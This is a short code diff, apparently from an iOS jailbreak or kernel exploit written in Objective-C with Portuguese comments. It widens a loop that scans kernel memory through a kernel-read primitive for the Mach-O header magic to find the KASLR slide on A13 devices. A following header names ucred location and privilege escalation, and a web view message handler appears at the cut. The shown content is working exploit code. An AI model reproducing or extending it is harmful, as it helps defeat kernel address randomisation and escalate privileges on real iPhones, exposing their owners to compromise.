@@ -40,15 +40,23 @@ extern kern_return_t mach_vm_map(vm_map_t, mach_vm_address_t *, mach_vm_size_t, 
 // 3. BUSCA DO KERNEL SLIDE
 - (uint64_t)getKernelSlide {
     if (_kernel_slide != 0) return _kernel_slide;
-    for (uint64_t i = 0; i < 0x80000; i++) {
-        uint64_t addr = 0xFFFFFFF007004000 + (i * 0x4000);
-        if (([self kread64:addr] & 0xFFFFFFFF) == 0xfeedfacf) {
+
+    // Tente uma base de busca mais alta para o A13
+    uint64_t search_base = 0xFFFFFFF007004000; 
+    
+    for (uint64_t i = 0; i < 0x100000; i++) { // Aumentamos o range de busca significativamente
+        uint64_t addr = search_base + (i * 0x4000);
+        uint64_t val = [self kread64:addr];
+        
+        // Se o kread64 retornar 0xDEADBEEF, o app não tem permissão de leitura
+        if ((val & 0xFFFFFFFF) == 0xfeedfacf) {
             _kernel_slide = (i * 0x4000);
             return _kernel_slide;
         }
     }
     return 0;
 }
+
 
 // 4. LOCALIZAÇÃO DO UCRED E ESCALADA
 - (void)userContentController:(WKUserContentController *)userContentController 
